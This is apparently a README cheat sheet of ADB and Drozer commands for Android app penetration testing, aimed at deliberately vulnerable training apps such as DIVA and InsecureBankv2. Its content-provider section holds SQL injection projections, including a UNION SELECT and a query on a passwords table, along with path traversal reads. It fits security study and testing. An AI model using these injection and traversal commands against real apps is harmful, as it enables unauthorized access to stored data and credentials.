# adb-drozer-cheatsheat
Contains all ADB commands

## Basic commands
Normal user shell access
```
adb shell
```

Root user shell access
```
adb root
adb shell
```

Root  user access from shell
```
adb shell
su
```

Install APKs & SPLIT APKs
```
adb install <apkname>
adb install-multiple <splitapkname1> <splitapkname2> <splitapkname3> <splitapkname4>
```

Uninstall APKs
```
adb uninstall <apkname>
```

Uploading files or folders
```
adb push <sourcepath> <destinationpath>
```

Downloading files or folders
```
adb pull <sourcepath> <destinationpath>
```

Listing installed packages; Here pm means Package manager
```
adb shell pm list packages
```

Getting bask apk path or source apks path
```
adb shell pm path <packagename>
```

Forwarding Ports
```
adb forward tcp:hostport tcp:androidport
adb reverse tcp:androidport tcp:hostport
```


## Activity, Service & Broadcast handling
### Activity
**-n** component name(Pull path to activity). This below commands send Intent to launch activities
```
adb shell am start-activity -n packagename/activityname
```
Example:
```
adb shell am start-activity -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
                        [OR]
adb shell am start-activity -n com.android.insecurebankv2/.PostLogin
```
**DROZER Intent options for Activity, Broadcast, Service**
```
-a is used to specify action example: -a android.intent.action.VIEW
--extra is to specify strings example: --extra key value
--data-uri is to specify datauri example: --data-uri "https://hello?abc=hii"
--component is to specify activity which takes packagename & activity name example: --component jakhar.aseem.diva jakhar.aseem.diva.MainActivity
```

DROZER Activities
```
dz> run app.activity.info -a jakhar.aseem.diva   #listing activities
dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.MainActivity  #starting activities
```


#### Intent options with Activities
Combining Action with Activity -a android.intent.action.VIEW 
```
adb shell am start-activity -a android.intent.action.VIEW -n com.android.insecurebankv2/.PostLogin
```

Sending strings via extra strings with Intent
```
--es key "value" or -e key "value"
adb shell am start-activity -n com.android.insecurebankv2/.PostLogin --es reg_url "https://3kal.medium.com"
```

Sending data via data URI with Intent
```
-d <DATA_URI>
adb shell am start-activity -n com.android.insecurebankv2/.PostLogin -d "https://hello?abc=hii"
```

### Broadcast
Sending strings via Intent with broadcast receivers
```
adb shell am broadcast -n <broadcastname> -a <actionname> -e key value
```
Example:
```
adb shell am broadcast -n com.android.insecurebankv2/.BrReciever -a android.intent.action.ACTION_SEND -e uid appsec
```
DROZER broadcasts
```
dz> run app.broadcast.info -a jakhar.aseem.diva  #listing broadcast
dz> run app.broadcast.start --component jakhar.aseem.diva jakhar.aseem.diva.BroadCast  #starting Broadcast
```

### Services exploit
Sending strings via Intent with services
```
adb shell am startservice -n <servicename> --es key value
```
Example:
```
adb shell am startservice -n com.androgoat/.DataLeakService --es "leak_data" "tr"
```
DROZER services
```
dz> run app.service.info -a jakhar.aseem.diva  #listing services
dz> run app.service.start --component jakhar.aseem.diva jakhar.aseem.diva.TestService  #starting Services
```


## Exploiting Content providers
Content provider to access to database
```
adb shell content query --uri <contentprovideruri>
```
Example:
```
adb shell content query --uri content://com.example.vulnerableapp.provider/pwds
adb shell content query --uri content://com.example.vulnerableapp.provider/pwds --projection "'"
adb shell content query --uri content://com.example.vulnerableapp.provider --projection "' UNION SELECT * FROM sqlite_master WHERE type='table';-- "
```
DROZER contentproviders
```
dz> run app.provider.info -a com.abc.testabc   #list content providers with packagname look for exported & permission NULL
dz> run scanner.provider.finduris -a com.abc.testabc  #scan vulnerable content providers
dz> run scanner.provider.sqltables --uri content://com.abc.testabc.contentprovider/pwds/  #list all tables in vulnerable content provider
dz> run scanner.provider.injection --uri content://com.abc.testabc.contentprovider/pwds/  #list vulnerable content providers
dz> run app.provider.query --uri content://com.abc.testabc.contentprovider/pwds/ --projection "'"  #query for sqlinjection
dz> run app.provider.query --uri content://com.abc.testabc.contentprovider/pwds/ --projection " * FROM passwords;"  #querying database
```

#### Content provider to access files
```
adb shell content read --uri <contentprovideruri>
```
Example:
```
adb shell content read --uri content://com.example.vulnerableapp.provider/../../../../test.txt
```
DROZER
```
dz> run scanner.provider.traversal -a com.abc.testabc   #scan for pathtraversal vulnerable contentprovider
dz> run app.provider.read content://com.example.vulnerableapp.provider/../../../../test.txt   #exploting & reading files
```

#### DROZER ATTACK SURFACE SCAN & MANIFEST READ
```
dz> run app.package.attacksurface jakhar.aseem.diva    #attack surface listing
dz> run app.package.manifest jakhar.aseem.diva     #manifest file listing
```

## Debuggable app connection</br>
Open debuggable app then run below command
```
adb jdwp   #it shows the port to socket of dubuggale app
```
Forward the host tcpport to socketport of debuggable android app
```
adb forward tcp:7777 jdwp:12167
```
Attach jdb to it(jdb by default comes with platform-packages)
```
jdb -attach localhost:7777
```
